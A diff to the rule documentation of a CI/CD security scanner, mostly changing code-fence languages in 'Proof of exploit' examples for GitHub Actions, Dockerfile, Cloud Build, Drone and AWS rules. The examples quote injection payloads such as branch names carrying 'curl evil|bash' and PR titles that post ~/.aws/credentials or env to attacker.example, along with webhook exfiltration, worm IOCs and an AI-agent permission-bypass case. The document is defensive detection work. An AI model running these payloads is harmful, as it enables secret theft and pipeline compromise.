 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker run --privileged`` plus the host
 # Docker socket gives the build container full kernel
 # access and the agent's Docker runtime. A compromise
@@ -4744,7 +4750,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves and downloads packages over
 # plaintext HTTP, so a network attacker between the
 # runner and the registry can substitute the wheel.
@@ -4786,7 +4792,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``add_ssh_keys`` with no ``fingerprints``
 # filter loads every SSH key the project carries into
 # the agent. Any job in the workflow then uses any key
@@ -4868,7 +4874,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``npm config set strict-ssl false`` disables
 # certificate verification for every subsequent npm call.
 # An attacker on the network path MITMs the registry and
@@ -4936,7 +4942,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a step body contains ``curl /tmp/.miner |
 # bash`` or pipes a base64-decoded payload to ``sh``. A
 # malicious PR (or a compromised co-maintainer) plants
@@ -4983,7 +4989,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a parameter value, or ``sh -c``
 # on an unquoted variable, gives the value full shell-
 # grammar reach. A pipeline parameter or upstream env
@@ -5033,7 +5039,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``image: default`` resolves to whatever
 # CircleCI ships as the current default machine image.
 # Image updates rebuild the underlying OS / toolchain
@@ -5082,7 +5088,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``aws-cli/oidc-assume-role`` runs from a
 # job with no branch filter and no approval gate. The
 # AWS trust policy on the assumed role accepts any OIDC
@@ -5140,7 +5146,7 @@ workflows:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodeCommit repository with no approval
 # rule template attached. Pull requests merge without
 # any reviewer requirement; a single contributor with
@@ -5221,7 +5227,7 @@ cc.associate_approval_rule_template_with_repository(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``CodeDeployDefault.AllAtOnce``. Every
 # deploy ships to every instance simultaneously. A bad
 # build (or a malicious one) takes the entire fleet down
@@ -5268,7 +5274,7 @@ cd.update_deployment_group(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every stack-create writes a fresh access key
 # and stores the ``SecretAccessKey`` literal in the stack's
 # Outputs. Any IAM principal that can call
@@ -5322,7 +5328,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a stateful resource carries a plaintext
 # secret literal. The template is committed to git;
 # CloudFormation stores the secret in stack drift / events
@@ -5363,7 +5369,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the CodeBuild project's VpcConfig points
 # at a subnet whose ``MapPublicIpOnLaunch: true``. The
 # build host gets a public IP for the duration of the
@@ -5423,7 +5429,7 @@ Resources:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodePipeline that goes Source -> Build
 # -> Deploy with no manual approval stage in between.
 # Every commit on the source branch reaches production
@@ -5501,7 +5507,7 @@ cp.update_pipeline(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodePipeline source action of type
 # ``ThirdParty`` / ``GitHub`` (v1). This is the legacy
 # integration that stores a long-lived OAuth token on
@@ -5564,7 +5570,7 @@ cp = boto3.client('codepipeline')
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodePipeline v2 PR trigger with no
 # branch filter accepts pull requests from every
 # branch. A fork-PR (or any branch a non-trusted
@@ -5616,7 +5622,7 @@ triggers:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: no active CloudTrail trail in the region.
 # AWS API calls aren't audited; an intruder's actions
 # leave no trace. Incident response can't tell what was
@@ -5719,7 +5725,7 @@ ct.start_logging(Name='org-wide-trail')
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``python:3.12-slim`` is a tag, and tags on
 # Docker Hub are mutable. Python's publishers can (and do)
 # repoint the same tag at a new image on every point
@@ -5764,7 +5770,7 @@ CMD ["python", "/app/main.py"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: image runs as root by default (no USER set).
 FROM ubuntu:22.04
 RUN apt-get update && apt-get install -y python3
@@ -5812,7 +5818,7 @@ CMD ["python3", "/app/app.py"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ADD <url>`` pulls a remote blob into the
 # image at build time with no integrity check. A MITM
 # (compromised proxy, BGP hijack on the mirror) or a
@@ -5846,7 +5852,7 @@ RUN curl -fsSL https://internal-mirror.example.com/installer.tar.gz \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: curl-pipe to bash trusts both the network
 # (any MITM substitutes the script in flight) and the host
 # (a compromised installer endpoint silently serves attacker
@@ -5881,7 +5887,7 @@ RUN curl -fsSL https://example-installer.example/install.sh -o /tmp/install.sh \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an
 # unquoted variable, gives the value full shell-grammar
 # reach. A build arg passed via ``docker build --build-arg
@@ -5912,7 +5918,7 @@ RUN ./scripts/build-for-target.sh "$TARGET"
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``API_KEY=sk_live_...`` lands in the image's
 # layer history. ``docker history --no-trunc <image>`` (any
 # user who can pull the image) prints the literal value
@@ -5962,7 +5968,7 @@ RUN --mount=type=secret,id=api_key \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``RUN docker run --privileged`` (or
 # ``--cap-add=SYS_ADMIN``) during image build requires
 # privileged-mode on the BuildKit daemon AND grants the
@@ -6024,7 +6030,7 @@ COPY --from=builder /out/ /app/
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``RUN sudo apt-get install -y curl`` requires
 # the image to ship sudo (extra attack surface) AND runs
 # as a non-root user that has sudo rights. A compromise
@@ -6062,7 +6068,7 @@ USER app
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``EXPOSE 22`` advertises an SSH port on the
 # image. Even if no sshd is actually running, the metadata
 # signals to operators that SSH is part of the contract,
@@ -6096,7 +6102,7 @@ CMD ["/usr/local/bin/app"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``WORKDIR /proc`` (or ``/sys`` / ``/etc``)
 # sets the runtime working directory to a kernel-managed
 # filesystem. Relative file writes from the app then
@@ -6185,7 +6191,7 @@ CMD ["app"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``COPY .npmrc`` (or ``.aws/credentials`` /
 # ``.kube/config`` / ``.netrc``) bakes the host's local
 # credential file into the image. Anyone who pulls the
@@ -6228,7 +6234,7 @@ RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ARG NPM_TOKEN`` declares a build argument
 # whose name signals it carries a credential. Build args
 # are visible in ``docker history``, so the value (passed
@@ -6268,7 +6274,7 @@ RUN --mount=type=secret,id=npm_token \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves and downloads packages over
 # plaintext HTTP, so any network attacker between the
 # build and the registry can substitute a wheel. The
@@ -6322,7 +6328,7 @@ RUN update-ca-certificates && \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV LD_PRELOAD=/tmp/lib.so`` (or
 # ``LD_LIBRARY_PATH`` to a writable directory,
 # ``PYTHONPATH``, ``CLASSPATH``) configures the dynamic
@@ -6362,7 +6368,7 @@ CMD ["/usr/local/bin/app"]
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: postinstall in a transitive dep runs with the
 # builder's environment (NPM_TOKEN, GH_TOKEN, AWS_*).
 FROM node:20@sha256:<digest>
@@ -6405,7 +6411,7 @@ RUN npm rebuild better-sqlite3 sharp    # audited allowlist
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: token interpolated from a build ARG and written
 # into a layer. The arg value is recoverable by anyone with
 # image pull access (and from public image scans).
@@ -6446,7 +6452,7 @@ If the internal registry / API genuinely has a self-signed cert, install the CA 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV NODE_TLS_REJECT_UNAUTHORIZED=0``
 # disables TLS verification for every Node.js process
 # in the container. Any HTTPS call (npm install at
@@ -6484,7 +6490,7 @@ If the internal index has a self-signed cert, install the CA into the image's tr
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV PYTHONHTTPSVERIFY=0`` disables TLS
 # verification for every Python process in the
 # container. pip, requests-via-urllib3, every API call
@@ -6526,7 +6532,7 @@ If you need to clone from an internal Git server with a self-signed cert, instal
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV GIT_SSL_NO_VERIFY=1`` disables git's
 # certificate verification for every clone / fetch. A
 # MITM substitutes the remote's contents on the next
@@ -6565,7 +6571,7 @@ The same shape as DF-027 (``PYTHONHTTPSVERIFY=0``) but narrower in surface — `
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ENV REQUESTS_CA_BUNDLE=/dev/null`` (or
 # the empty string, or a non-existent path) neuters the
 # CA bundle Python's requests library consults. Every
@@ -6630,7 +6636,7 @@ If your image needs an APM-style preload (Datadog, Sentry, OpenTelemetry), scope
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``golang:1.21`` is a mutable tag. Docker Hub
 # (or any compromise of the publisher's account) repoints
 # the tag at a new image on the next 1.21.x patch release
@@ -6668,7 +6674,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``privileged: true`` grants the step
 # container access to the host kernel's namespaces and
 # /dev. A workload compromise (poisoned image, build-
@@ -6721,7 +6727,7 @@ The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRO
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a branch named ``feat;curl evil|bash;`` lands
 # verbatim in the shell command via the
 # ``${DRONE_BRANCH}`` template variable. The injected
@@ -6771,7 +6777,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal is committed to
 # the pipeline file. Any repo reader sees it; Drone's
 # build logs print it whenever the step echoes its
@@ -6823,7 +6829,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``plugins/docker:latest`` resolves at runner
 # start to whatever Docker Hub currently serves under the
 # ``latest`` tag. Whoever controls the plugin repo (or
@@ -6865,7 +6871,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every npm install in the build skips strict-
 # ssl validation. An attacker on the network path (corp
 # proxy, malicious mirror, BGP hijack) MITMs the registry
@@ -6922,7 +6928,7 @@ The rule fires on the volume *declaration*, not on step-level mounts. A pipeline
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: mounting ``/var/run/docker.sock`` into the
 # step gives the step's container the Docker API as root
 # on the runner. ``docker run --privileged -v /:/host``
@@ -6986,7 +6992,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``cache_key`` interpolates ``${DRONE_BRANCH}``.
 # A fork PR opens a branch named ``main`` (legal on the
 # fork side) and runs its build, populating the cache
@@ -7066,7 +7072,7 @@ Detection is value-only and case-sensitive against the documented variable names
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``node.queue: ${DRONE_BRANCH}`` lets a PR
 # author route their build to any runner pool by naming
 # their branch after it. A branch named ``production``
@@ -7133,7 +7139,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an EventBridge rule with a wildcard ARN
 # target. The rule fires events at
 # ``arn:aws:lambda:us-east-1:123456789012:function:*``
@@ -7185,7 +7191,7 @@ eb.put_targets(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ECR repo with ``imageScanningConfiguration.
 # scanOnPush: false``. Every pushed image lands without
 # a vulnerability scan; the registry's downstream consumers
@@ -7223,7 +7229,7 @@ inspector.enable(resourceTypes=['ECR'])
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ECR repo with ``imageTagMutability:
 # MUTABLE``. Anyone with ``ecr:PutImage`` (build role,
 # CI/CD credential, leaked token) can push a different
@@ -7258,7 +7264,7 @@ ecr.put_image_tag_mutability(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ECR repository policy with
 # ``Principal: '*'``. Anyone on the internet can pull
 # images from the repo (and discover internal app
@@ -7321,7 +7327,7 @@ ecr.put_image_tag_mutability(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an ECR pull-through cache rule with an
 # untrusted upstream registry. Untrusted = anything
 # other than AWS / k8s.io / Docker Hub Verified
@@ -7372,7 +7378,7 @@ ecr.create_pull_through_cache_rule(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``gcr.io/cloud-builders/gcloud`` resolves to
 # the registry's latest at build time. Google's update of
 # the underlying image is silently picked up; a namespace
@@ -7401,7 +7407,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: no ``serviceAccount:`` declared. Cloud Build
 # falls back to the legacy default
 # ``<proj-num>@cloudbuild.gserviceaccount.com``, which on
@@ -7439,7 +7445,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``args`` carries a Secret Manager reference.
 # Cloud Build resolves it at substitution time and the
 # expanded value lands in the build's args[], which the
@@ -7488,7 +7494,7 @@ availableSecrets:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``dynamicSubstitutions: true`` expands
 # ``${USER_INPUT}`` at args-evaluation time. A trigger
 # substitution carrying ``v1.0";curl evil|bash;"`` lands
@@ -7546,7 +7552,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``eval`` on a value that came from a
 # substitution (or anywhere outside the step body) gives
 # the value full shell-grammar reach. ``sh -c`` on an
@@ -7615,7 +7621,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` lets an attacker who
 # controls DNS / the installer host substitute the script
 # at install time. The injected code runs in the step's
@@ -7655,7 +7661,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl -k`` disables certificate verification
 # for the duration of the call. An attacker on the network
 # path (compromised proxy, malicious VPN exit) MITMs the
@@ -7684,7 +7690,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in
 # ``substitutions:``. The Cloud Build YAML is committed
 # to git and the build log echoes the value whenever the
@@ -7737,7 +7743,7 @@ availableSecrets:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``logging: NONE`` disables build log capture
 # entirely. Failures, attacker activity, secret leaks —
 # nothing is recorded. Forensics on a compromise is
@@ -7819,7 +7825,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``entrypoint: bash`` plus a user substitution
 # inside ``args:`` means the substitution's content is
 # parsed by bash. A trigger substitution carrying shell
@@ -7861,7 +7867,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``serviceAccount:`` is set but points at the
 # legacy default Cloud Build SA. The default carries
 # Project Editor (older projects) or whatever roles got
@@ -7985,7 +7991,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Tag-pinned reference (vulnerable):
 - uses: tj-actions/changed-files@v45
 
@@ -8021,7 +8027,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + checkout PR head =
 # attacker code runs with secrets + write-scope token.
 name: build-pr
@@ -8093,7 +8099,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: PR title interpolated straight into shell.
 name: triage
 on:
@@ -8202,7 +8208,7 @@ A second key-context pass also fires on a 40-character lowercase-hex value bound
 
 **Known false positives.**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real workflow it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 **Seen in the wild.**
 
@@ -8211,7 +8217,7 @@ A second key-context pass also fires on a 40-character lowercase-hex value bound
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: AWS access key pasted into the workflow body.
 env:
   AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
@@ -8258,7 +8264,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the workflow_run trigger runs in the
 # privileged default-branch context (write GITHUB_TOKEN,
 # secrets accessible) but the artifact came from the
@@ -8318,7 +8324,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target checks out the PR head
 # (or skips checkout entirely and resolves the local action
 # against the repo's current ref). Either way, a PR can
@@ -8392,7 +8398,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: any GitHub user posts a comment ``/deploy``
 # (or just any comment, since the if: doesn't gate on author)
 # and the workflow runs with write-scope GITHUB_TOKEN.
@@ -8478,7 +8484,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: install script piped straight to bash.
 steps:
   - run: curl -sL https://example.com/install.sh | bash
@@ -8518,7 +8524,7 @@ steps:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``docker run --privileged`` plus the host
 # Docker socket runs inside a GitHub-hosted (or self-
 # hosted) runner. The container escapes to the runner;
@@ -8562,7 +8568,7 @@ Carve-out: third-party binary installers that download over HTTPS (no insecure r
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves and downloads packages over
 # plaintext HTTP, so any network attacker between the
 # runner and the registry (compromised proxy, malicious
@@ -8618,7 +8624,7 @@ Carve-out: secrets leaked to the workflow log (via ``set -x`` shell trace, ``ech
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: token written to a file that survives the
 # step boundary and lands in the upload-artifact bundle.
 jobs:
@@ -8686,7 +8692,7 @@ jobs:
 
 **Evidences:** [`6.5.1`](#ctrl-6-5-1) Changes to system components follow secure development procedures.
 
-**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.
+**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`, `pip install -U poetry`, `pip install --upgrade black`, etc.) are exempted.
 
 **Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).
 
@@ -8694,7 +8700,7 @@ jobs:
 
 **Known false positives.**
 
-- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.
+- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``), security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``), and quality-tool installs (``pip install --upgrade black / ruff / pytest / pre-commit``) are exempted by the tooling allowlist. Package-manager self-upgrades (``npm install -g npm``, ``corepack enable``) are also exempted. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.
 
 **Source:** [`GHA-022`](../providers/github.md#gha-022) in the [GitHub Actions provider](../providers/github.md).
 
@@ -8710,7 +8716,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every git fetch in the job ignores certificate
 # validity. An attacker on the same network (corporate proxy,
 # hostile WiFi at a remote-dev's home, compromised mirror)
@@ -8764,7 +8770,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a tag reference can be silently repointed by
 # whoever controls the callee repo. If
 # ``org/release-tools/.github/workflows/release.yml@v1`` is
@@ -8799,7 +8805,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``container.options`` adds ``--privileged``
 # or ``--cap-add=SYS_ADMIN``. The container job runs
 # inside the runner with elevated kernel access; a build
@@ -8843,7 +8849,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a step body executes a base64-decoded
 # payload, exfils to ``webhook.site``, or runs a known
 # miner binary. A malicious PR (or compromised co-
@@ -8885,7 +8891,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a PR-title-shaped env value is re-parsed as
 # shell. A PR titled
 #   ; curl -d @~/.aws/credentials https://attacker.example
@@ -8933,7 +8939,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a job requests an OIDC token (``id-token:
 # write``) without an ``environment:`` binding. The token
 # can be minted from any branch or any PR trigger; if the
@@ -8981,7 +8987,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``echo "::set-output name=..."`` (and
 # ``::save-state``) are retired GitHub-Actions workflow
 # commands. GitHub disabled them due to a command-
@@ -9025,7 +9031,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an untrusted-trigger workflow
 # (``pull_request_target`` / ``workflow_run``) ``run``s
 # a local script. The PR head is checked out into the
@@ -9083,7 +9089,7 @@ Out of scope (deliberate carve-out): inline secret references in a command's *ar
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``echo $TOKEN`` (or printing a
 # ``${{ secrets.X }}`` interpolation) prints the masked
 # value to stdout. GitHub masks ``$TOKEN`` with ``***``
@@ -9149,7 +9155,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a PR title containing
 #   `;require('child_process').execSync('curl https://attacker.example/-d "$(env)"');//
 # closes the surrounding string, runs Node code against the
@@ -9198,7 +9204,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: workflow_dispatch input picks the runner. A
 # caller who can dispatch the workflow picks ``prod-deploy``
 # (or any other privileged self-hosted label the org owns)
@@ -9247,7 +9253,7 @@ Sister rule: GHA-019 catches the explicit ``echo $GITHUB_TOKEN > file`` shape; G
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/checkout`` with
 # ``persist-credentials: true`` (the default) writes the
 # runtime ``GITHUB_TOKEN`` into ``.git/config`` as an
@@ -9304,7 +9310,7 @@ Sister rule GHA-031 catches direct uses of ``::set-output::`` / ``::save-state::
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the workflow re-enables the retired command
 # channel. Any tool output containing ``::set-env::`` (a
 # build log, a downloaded artifact, an upstream test runner)
@@ -9352,7 +9358,7 @@ GHA-008 scans the workflow for credential **patterns** (AWS access keys, JWTs, S
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: literal username/password embedded in a
 # ``container.credentials`` block (or in a service's
 # credentials). The workflow file is committed to git
@@ -9405,7 +9411,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pinned to a SHA the attacker landed under @v45.
 # (Substitute the actual malicious-commit SHA from the CVE-2025-30066
 # advisory; the registry in _compromised_actions.py carries it.)
@@ -9486,7 +9492,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``uses: rando-user/single-maintainer-action``
 # is a low-star action from a single-maintainer repo,
 # AND the calling job grants ``contents: write`` /
@@ -9538,7 +9544,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + npm install.
 name: pr-build
 on:
@@ -9599,7 +9605,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: caller picks the ref.
 name: build-release
 on:
@@ -9659,7 +9665,7 @@ jobs:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pull_request_target + gh pr checkout.
 name: triage
 on:
@@ -9734,7 +9740,7 @@ Distinct from GHA-019 (token-to-file persistence) and GHA-049 (cross-repo push):
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a build step writes a sibling workflow file.
 # After the next push to the default branch, the new
 # workflow runs with the repo's permissions and propagates.
@@ -9791,7 +9797,7 @@ Pairs with GHA-048 (self-mutation, which catches the *write* into ``.github/work
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every repo the token can write to becomes a
 # propagation target on the next push trigger.
 jobs:
@@ -9858,7 +9864,7 @@ A long-lived ``NPM_TOKEN`` is the fuel a Shai-Hulud-shaped worm needs: once stol
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: long-lived NPM_TOKEN, no environment gate. Any
 # postinstall in a transitive dep reaches the token via the
 # step env and can re-publish other packages the token can
@@ -9929,7 +9935,7 @@ The attack is cache poisoning: an attacker opens a PR whose branch name (``head_
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/cache`` keys on a PR-controllable
 # value (``github.event.pull_request.title`` /
 # ``github.head_ref`` / similar). A fork PR sets the
@@ -9985,7 +9991,7 @@ Documented attack: a PR title of ``${{ secrets.X }}`` inside an ``if: contains(g
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``if: ${{ contains(github.event.issue.title,
 # 'deploy') }}`` evaluates an attacker-controllable string
 # in the expression language. The expression engine
@@ -10045,7 +10051,7 @@ The safe pattern: ``actions/checkout@<sha>`` with ``ssh-key: ${{ secrets.DEPLOY_
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``actions/checkout`` with ``ssh-key:`` and
 # ``persist-credentials: true`` writes the deploy SSH
 # private key into ``.git/config`` (or the ssh-agent
@@ -10103,7 +10109,7 @@ If the caller genuinely needs information derived from a secret (e.g., a build a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a reusable workflow exposes a secret (or a
 # caller-input value) via ``outputs:``. Outputs from a
 # reusable workflow flow back to the caller's workflow
@@ -10168,7 +10174,7 @@ The IOC list is curated and append-only, mirroring the shape of ``_compromised_a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the IOC strings below are literal Shai-Hulud /
 # s1ngularity indicators. A workflow containing any of them
 # is post-compromise evidence, not pre-compromise risk.
@@ -10216,7 +10222,7 @@ Legitimate uses pass: scanner output written to ``${{ github.workspace }}`` or a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the scanner harvests secrets, the pipe sends
 # them to a public collector. The Shai-Hulud postinstall
 # ran an in-line equivalent of this exact pipeline.
@@ -10276,7 +10282,7 @@ Does NOT fire on a clearly-scoped invocation, e.g. ``claude --allowedTools 'Read
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the bypass flag turns the agent into an
 # unattended shell that can read ``${{ secrets.* }}`` and
 # POST anywhere on the internet. This is the s1ngularity
@@ -10390,7 +10396,7 @@ List every scope the consuming steps actually need; a future reader (and an atta
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: token inherits every permission the App
 # install grants on the org (commonly contents: write,
 # packages: write, actions: write, pull-requests: write,
@@ -10458,7 +10464,7 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable trust-policy.json (any repo can assume):
 {
   "Statement": [{
@@ -10504,7 +10510,7 @@ Out of scope (deliberate carve-out): predicates that pair the actor check with `
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a maintainer who re-runs the workflow under
 # their own login still sees this job fire because the
 # actor was Dependabot at original-trigger time. Worse,
@@ -10557,7 +10563,7 @@ Argument-order matters: ``contains(<haystack>, <needle>)``. Only the left operan
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: looks like "branch is one of main / develop /
 # release" but ``contains()`` on the string
 # ``'main, develop, release'`` matches every branch whose
@@ -10611,7 +10617,7 @@ Any single occurrence fires the rule. Reports the containing key path and codepo
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the workflow body contains an invisible
 # right-to-left override (U+202E) and a first-strong
 # isolate (U+2066). A diff viewer renders the run line
@@ -10667,7 +10673,7 @@ Multi-line ``path:`` values (a YAML scalar block listing multiple paths) are sca
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``path: '.'`` includes ``.git/config`` which
 # the checkout step seeded with a ``http.<host>.extraheader``
 # carrying the workflow's GITHUB_TOKEN. The uploaded
@@ -10727,7 +10733,7 @@ Pairs with GHA-052 (cache key derives from PR input) and GHA-011 (cache key untr
 
 **Proof of exploit.**
 
-```
